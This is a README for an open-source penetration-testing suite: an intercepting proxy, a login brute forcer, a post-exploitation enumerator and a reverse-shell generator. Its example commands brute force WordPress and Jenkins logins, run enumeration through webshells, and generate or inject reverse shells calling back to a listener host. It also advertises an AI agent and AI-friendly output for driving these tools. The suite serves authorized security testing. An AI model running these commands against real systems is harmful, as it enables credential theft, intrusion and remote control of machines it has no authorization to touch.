# intercept37

> *"The ships hung in the sky in much the same way that bricks don't."*
> *This proxy hangs in your traffic in much the same way that firewalls wish it wouldn't.*

An open-source intercepting proxy and pentest suite that speaks fluent JSON, explains itself when asked, and genuinely believes LLMs deserve nice APIs too.

Think Burp Suite, but free, with a terminal-friendly attitude and an alien aesthetic. Also, it brought friends — a brute forcer, a post-exploitation enumerator, and a reverse shell generator walked into a bar. The bartender said, "Is this a coordinated attack?" They said, "Only with authorization."

**Don't Panic.** There are four tools and they all have `--explain`.

---

## The Arsenal

### `intercept37` — The Mothership

The intercepting proxy at the center of it all. Routes through port **8080**, serves a dashboard on port **1337** (obviously), and keeps track of everything that moves.

- **Proxy** — mitmproxy-based MITM proxy with full request/response capture
- **Dashboard** — React/Vite web UI, alien dark theme, live traffic via WebSocket
- **Vuln Scanner** — SQLi, XSS, command injection, path traversal, SSRF, open redirect, security header analysis
- **AI Agent** — Claude-powered with 16 tools for automated security analysis, payload suggestions, and report generation
- **API** — REST endpoints for everything. Repeater, scanner, stats, LLM analysis. Your scripts will feel right at home

```bash
intercept37 start
# Dashboard: http://localhost:1337
# Proxy:     http://localhost:8080
```

### `breach37` — The Door Kicker

*Replaces Hydra for web form attacks.* Async HTTP brute forcer that actually understands web apps.

WordPress, Jenkins, Drupal — each has a preset that auto-configures login paths, form fields, failure detection, and CSRF handling. No more guessing parameter names from page source.

Benchmarked at **2x Hydra's speed** on equivalent targets (72 req/s vs 34 req/s). Async concurrency turns out to be useful. Who knew.

```bash
# WordPress — just point and shoot
breach37 wordpress --url http://target/blog/ --user admin

# Jenkins
breach37 jenkins --url http://target:8080/ --user admin

# Custom form with failure detection
breach37 http-form --url http://target/login \
    --user admin --fail-string "Invalid credentials"

# See all presets
breach37 presets --human
```

### `recon37` — The Probe

*Replaces LinPEAS.* Post-exploitation enumerator that works through whatever access you have — webshell, SSH, or local.

Runs 42 enumeration commands across 8 categories: system info, users, SUID binaries, credentials, network, cron jobs, Docker, and writable paths. Cross-references findings against GTFOBins because you deserve nice things.

```bash
# Got a webshell? Use it
recon37 enum --webshell "http://target/shell.php?cmd={cmd}"

# SSH access
recon37 enum --ssh user@target --password hunter2

# Already on the box
recon37 enum --local

# Pick specific checks
recon37 enum --local --checks suid,creds,docker --human
```

### `venom37` — The Payload Factory

*Replaces msfvenom and revshells.com.* Generates reverse shells in 16 flavors with encoding options, listener commands, and WordPress theme injection.

No more googling "bash reverse shell one-liner" and praying the quoting is right.

```bash
# Bash reverse shell with listener command
venom37 gen bash 10.0.0.1 4444 --with-listener --human

# PHP payload, base64 encoded for tight spaces
venom37 gen php 10.0.0.1 4444 --encode base64

# Inject into WordPress theme editor (got admin creds from breach37?)
venom37 wp-inject -t http://target -u admin -p cracked123 \
    --lhost 10.0.0.1 --lport 4444

# What shells are available?
venom37 list --human
```

---

## LLM-First Design

Every tool in the suite follows the same philosophy. You shouldn't need a wrapper script to make security tools talk to your AI agent.

| Feature | What it means |
|---------|---------------|
| **JSON by default** | Structured output. Every tool. Always. Parse it, pipe it, feed it to Claude |
| **`--human` flag** | Rich terminal output when a human is actually reading |
| **`--explain` flag** | Describes exactly what the tool will do, then exits. No surprises |
| **Teaching mode** | Results include context on *why* findings matter, not just *what* was found |
| **Python importable** | `from intercept37.brute.engine import HttpBrute` — use them as libraries |
| **Sane defaults** | Minimal required args. Presets handle the boring config |

---

## Quick Start

```bash
# Clone the transmission
git clone https://github.com/russelljadams/intercept37.git
cd intercept37

# Install (gets you all four tools)
pip install -e .

# Build the dashboard
cd frontend && npm install && npm run build && cd ..

# Optional: AI features need an API key
export ANTHROPIC_API_KEY=your-key-here

# Launch the mothership
intercept37 start
```

Configure your browser or target tool to proxy through `localhost:8080`. Open `http://localhost:1337` for the dashboard. Start intercepting.

The other tools work standalone — no proxy required:

```bash
breach37 wordpress --url http://target/ --user admin
recon37 enum --webshell "http://target/cmd.php?c={cmd}"
venom37 gen bash 10.0.0.1 4444 --with-listener
```

---

## Architecture

```
                        ┌──────────────────────────┐
                        │     intercept37           │
                        │     The Mothership        │
                        ├──────────────────────────┤
┌──────────────┐        │                          │        ┌──────────────┐
│  Dashboard   │◄──ws──►│  FastAPI                 │◄──────►│  Proxy Core  │
│  React/Vite  │        │  REST + WebSocket        │        │  (mitmproxy) │
│  :1337       │        │                          │        │  :8080       │
└──────────────┘        └─────┬──────┬──────┬──────┘        └──────────────┘
                              │      │      │
                    ┌─────────┤      │      ├─────────┐
                    │         │      │      │         │
              ┌─────┴─────┐  │  ┌───┴────┐ │  ┌──────┴─────┐
              │  Scanner   │  │  │  LLM   │ │  │  SQLite    │
              │  Engine    │  │  │  Agent │ │  │  Storage   │
              └───────────┘  │  │ 16 tools│ │  └────────────┘
                             │  └────────┘ │
        ┌────────────────────┼─────────────┼────────────────────┐
        │                    │             │                    │
  ┌─────┴─────┐        ┌────┴────┐   ┌────┴─────┐        ┌────┴────┐
  │ breach37  │        │ recon37 │   │ venom37  │        │  Python │
  │ Brute     │        │ Enum    │   │ Shells   │        │  API    │
  │ Force     │        │ 42 cmds │   │ 16 types │        │  Import │
  └───────────┘        └─────────┘   └──────────┘        └─────────┘
```

---

## Tech Stack

| Layer | Tech |
|-------|------|
| Proxy engine | mitmproxy |
| API server | FastAPI + uvicorn |
| Storage | SQLAlchemy + SQLite |
| Dashboard | React + TypeScript + Vite + Tailwind |
| HTTP client | httpx (async) |
| CLI | Click |
| AI | Anthropic Claude API |
| Runtime | Python 3.11+ |

---

## License

MIT. Hack the planet (legally).

## Disclaimer

This is a security testing tool. It does exactly what it says on the tin: intercept traffic, brute force logins, enumerate systems, and generate reverse shells.

**Use it only on systems you own or have explicit written authorization to test.** Unauthorized access to computer systems is illegal in most jurisdictions and will ruin your day in ways that no reverse shell can fix.

The authors are not responsible for misuse. The galaxy is already complicated enough.

*Mess with the best, get authorized in writing like the rest.*
